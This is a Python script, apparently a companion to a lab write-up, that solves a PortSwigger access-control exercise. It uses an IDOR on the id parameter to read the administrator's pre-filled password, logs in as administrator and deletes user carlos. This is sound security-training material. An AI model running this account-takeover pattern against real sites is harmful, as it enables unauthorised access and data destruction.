#!/usr/bin/env python3
"""
User ID controlled by request parameter with password disclosure
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 08-user-id-controlled-password-disclosure.md

What this does:
    Logs in as wiener and requests /my-account?id=administrator via the same
    IDOR as the earlier id-parameter labs. The administrator's account page
    pre-fills its password change field with the current value, so a
    quote-tolerant regex (PortSwigger labs mix single/double/unquoted HTML
    attributes) pulls the plaintext password straight out of the markup.
    Logs back in as administrator with the recovered password, opens /admin,
    and deletes carlos.

Usage:
    python 08-user-id-controlled-password-disclosure.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from urllib.parse import urljoin


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    login(client, lab_url, "wiener", "peter")

    resp = client.get(f"{lab_url}/my-account", params={"id": "administrator"})
    print(f"[*] /my-account?id=administrator: {resp.status_code}")

    # Handles single-quoted, double-quoted, and unquoted attribute styles.
    pw_match = re.search(r'name=.?password.?[^>]*value=["\']([^"\']+)["\']', resp.text)
    if not pw_match:
        pw_match = re.search(r'type=.?password.?[^>]*value=["\']([^"\']+)["\']', resp.text)
    if not pw_match:
        pw_match = re.search(r'value=["\']([^"\']+)["\'][^>]*type=.?password', resp.text)

    if not pw_match:
        print("[-] Could not extract administrator password.")
        return

    admin_pw = pw_match.group(1)
    print(f"[+] Administrator password: {admin_pw}")

    login(client, lab_url, "administrator", admin_pw)

    resp = client.get(f"{lab_url}/admin")
    delete_match = re.search(r'href="([^"]*\?username=carlos[^"]*)"', resp.text, re.IGNORECASE)
    if not delete_match:
        delete_match = re.search(r'href="([^"]*delete[^"]*carlos[^"]*)"', resp.text, re.IGNORECASE)

    if delete_match:
        delete_path = delete_match.group(1)
        delete_url = f"{lab_url}{delete_path}" if delete_path.startswith("/") else urljoin(f"{lab_url}/admin/", delete_path)
        client.get(delete_url)
    else:
        client.get(f"{lab_url}/admin/delete", params={"username": "carlos"})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- administrator password leaked via IDOR, carlos deleted.")
    else:
        print("[-] Not solved yet -- confirm the extracted password logs in successfully.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
